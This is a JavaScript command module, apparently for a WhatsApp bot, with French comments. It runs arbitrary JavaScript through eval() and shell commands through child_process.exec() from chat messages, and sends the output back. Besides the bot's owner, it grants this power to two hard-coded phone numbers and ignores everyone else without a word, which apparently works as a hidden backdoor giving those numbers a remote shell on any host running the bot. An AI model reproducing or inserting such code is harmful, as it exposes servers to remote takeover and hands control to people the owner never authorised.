/**
 * Master Control - Eval & Exec
 * 𝐃𝐚𝐫𝐤 — ʟ'ᴏᴍʙʀᴇ ɪɴᴄᴀʀɴᴇ́
 * SÉCURITÉ ABSOLUE : Seuls les Maîtres Suprêmes peuvent l'évoquer.
 * Version : 2.5 (Fix Détection Commandes & Alias)
 */

const { exec } = require('child_process');
const config = require('../../config.js');
const util = require('util');
const prefix = config.prefix || '.';

// Fonction pour le style Small Caps (Cohérence visuelle)
function toSmallCaps(text) {
  if (!text) return '';
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = String(text).toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'execute',
  aliases: ['>', '$', 'mastereval', 'masterexec', 'js'],
  category: '🔧 Configuration',
  description: '『 𝐃𝐈𝐏𝐏𝐄𝐑 』➪ ᴇxᴇᴄᴜᴛɪᴏɴ ᴅᴇ ᴄᴏᴅᴇ ᴇᴛ ᴄᴏᴍᴍᴀɴᴅᴇs sʏsᴛᴇᴍᴇ',
  usage: `${prefix}> [code] ou ${prefix}$ [commande]`,
  groupOnly: false,
  adminOnly: false,
  botAdminNeeded: false,

  async execute(sock, msg, args, extra) {
    const { reply, isOwner } = extra;

    try {
      // 👑 Tes numéros de Maîtres Suprêmes
      const supremeOwners = ['2290146202259', '2290155745907'];

      // 🛡️ EXTRACTION SÉCURISÉE DE TON NUMÉRO
      let senderJid = msg.key.fromMe 
        ? sock.user.id 
        : (msg.key.participant || msg.key.remoteJid);
      
      const bareJid = senderJid.split('@')[0].split(':')[0];
      const senderNumber = bareJid.replace(/\D/g, '');

      // On valide si tu es le maître
      const isMaster = supremeOwners.includes(senderNumber) || isOwner === true;

      // Discrétion absolue
      if (!isMaster) return; 

      // On extrait proprement le texte brut du message pour bypasser les bugs du handler
      const fullText = (msg.message?.conversation || msg.message?.extendedTextMessage?.text || '').trim();
      
      // On retire le préfixe
      const cleanText = fullText.startsWith(prefix) ? fullText.slice(prefix.length) : fullText;
      
      // On extrait la commande tapée
      const commandTrigger = cleanText.split(/\s+/)[0].toLowerCase();
      const codeToRun = args.join(' ').trim();

      // ─── 1. MODE EVALUATION JAVASCRIPT (Préfixes : '>', 'eval', 'js') ───
      if (['>', 'eval', 'js'].includes(commandTrigger)) {
        if (!codeToRun) return reply(`*🔮 ${toSmallCaps('entrez du code js a evaluer')}.*`);

        try {
          // Exécution du code dans le contexte
          let evaled = await eval(codeToRun);

          if (typeof evaled !== 'string') {
            evaled = util.inspect(evaled, { depth: 1 });
          }

          return reply(`${evaled}`);
        } catch (err) {
          return reply(`*❌ ${toSmallCaps('erreur d\'evaluation')} :*\n\`\`\`javascript\n${err.message}\n\`\`\``);
        }
      }

      // ─── 2. MODE EXECUTION TERMINAL (Préfixes : '$', 'exec') ───
      if (['$', 'exec'].includes(commandTrigger)) {
        if (!codeToRun) return reply(`*🖥️ ${toSmallCaps('entrez une commande systeme')}.*`);

        await reply(`*⏳ ${toSmallCaps('execution de')} :* \`${codeToRun}\` ...`);

        exec(codeToRun, (error, stdout, stderr) => {
          if (error) {
            return reply(`*❌ ${toSmallCaps('echec')} :*\n\`\`\`bash\n${error.message}\n\`\`\``);
          }
          if (stderr) {
            return reply(`*⚠️ ${toSmallCaps('alerte')} :*\n\`\`\`bash\n${stderr}\n\`\`\``);
          }

          return reply(`*📤 ${toSmallCaps('sortie')} :*\n\`\`\`bash\n${stdout || 'Commande exécutée sans retour.'}\n\`\`\``);
        });
      }

    } catch (e) {
      console.error('Master Command Error:', e);
    }
  }
};
